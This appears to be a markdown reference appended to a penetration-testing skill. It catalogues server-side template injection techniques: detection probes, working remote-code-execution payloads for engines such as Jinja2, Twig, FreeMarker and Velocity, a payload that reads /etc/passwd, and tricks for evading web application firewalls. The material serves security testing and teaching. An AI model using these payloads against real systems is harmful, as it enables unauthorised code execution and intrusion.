<!-- appsec-fyi delta — source-cited techniques from https://appsec.fyi/guide/ssti.html -->
<!-- Additive complement. Does NOT override this skill's own methodology/matrix. Owner skill rules win. -->

## Notable Techniques

Notable Techniques
The exploitation of SSTI vulnerabilities is highly dependent on the specific template engine and its configuration. However, several common techniques and approaches have emerged for detecting and exploiting these flaws across various platforms.

1. Basic Detection and Identification Payloads
The initial step in identifying SSTI is to use simple payloads that test for template engine evaluation. Mathematical expressions are a common and effective choice because their results are unlikely to appear coincidentally .

For example:

• {{7*7}} (Jinja2, Twig, Handlebars)

• ${7*7} (FreeMarker, Velocity, Thymeleaf)

• (ERB, EJS)

• #{7*7} (Pug, Thymeleaf)

If the response shows 49, it indicates server-side evaluation. Further probes like {{7*'7'}} can help differentiate between engines (e.g., Jinja2 vs. Twig) . Triggering errors with invalid syntax (e.g., {{undefined_variable}} or (1/0).zxy) can also reveal the template engine's name or version .

2. Object Chaining for RCE
In engines like Jinja2 (Python) and Twig (PHP), much of the exploitation relies on navigating the object model to find pathways to execute code. This often involves starting from a common, accessible object and traversing its attributes and methods .

A classic Jinja2 technique involves starting from a string literal (e.g., "" or request) and using special attributes to reach the base object class, then its subclasses, and finally a class that can execute commands :

• ''.__class__.__mro__.__subclasses__(): This chain accesses all loaded Python classes . The specific index for a desired class (like subprocess.Popen or _io._IOBase) can vary between Python versions and environments .

• config object: In Flask applications, the config object often holds sensitive information and can provide access to Python's built-in modules .

• self object: Some engines expose a self object that provides access to the environment, including the template engine's configuration and global functions .

For example, in Jinja2, to execute the id command: {{''.__class__.__mro__.__subclasses__().__repr__.__globals__.get('__builtins__').get('__import__')('subprocess').check_output('id')}} . A more stable approach uses accessible globals like cycler or lipsum: {{ cycler.__init__.__globals__.os.popen('id').read() }} .

3. Engine-Specific Execution Primitives
Each template engine provides distinct mechanisms for code execution:

• Smarty (PHP): Modifiers can directly call PHP functions. {system('id')} or {'id'|shell_exec} achieve RCE .

• Pug (Node.js): Raw JavaScript interpolation allows direct access to Node.js modules like child_process. #{require('child_process').execSync('ls')} is a common pattern .

• Twig (PHP): Can leverage global objects like _self to access the environment and register undefined filters to execute commands: {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}} . It can also be exploited via filter chaining: {{['id']|filter('system')}} .

• FreeMarker (Java): The freemarker.template.utility.Execute class can be instantiated to run commands: ${"freemarker.template.utility.Execute"?new()("id")} . Sandbox bypasses often involve reflection or accessing class loaders .

• Velocity (Java): Similar to FreeMarker, uses reflection to access java.lang.Runtime: #set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id')) .

• ERB (Ruby): Direct execution of Ruby code is possible: or .

• Razor (.NET): Text Transform (.tt) files can contain C# or VB code executed via utilities like TextTransform.exe or MSBuild.exe .

• Go (html/template): Exploitation relies on accessing exported methods of structs passed into templates, such as {{.Secret "id"}} or {{.File "/etc/passwd"}} .

4. Filter Bypasses
Web Application Firewalls (WAFs) and custom sanitization filters often blacklist dangerous characters or keywords (e.g., __, ., [, ], eval, system) . Bypassing these filters requires obfuscation and alternative syntax:

• String Concatenation/Manipulation: Building dangerous strings from smaller parts, using concatenation, or exploiting string formatting functions (e.g., |join, |format in Jinja2, chr() in PHP/Python) .

• Hex Encoding: Representing banned characters or strings using their hexadecimal escape sequences (e.g., \x5f for _) .

• Attribute Access via Functions/Methods: Instead of direct attribute access (e.g., obj.attr), using functions like obj|attr('attr') (Jinja2) or dictionary-style access like obj['attr'] .

• Using Alternative Tags: If {{...}} is blocked, {%...%} or line comments might be usable in some engines .

• Exploiting Object Properties/Methods: Using less common or indirectly accessible properties and methods that are not blacklisted, or exploiting reflection mechanisms .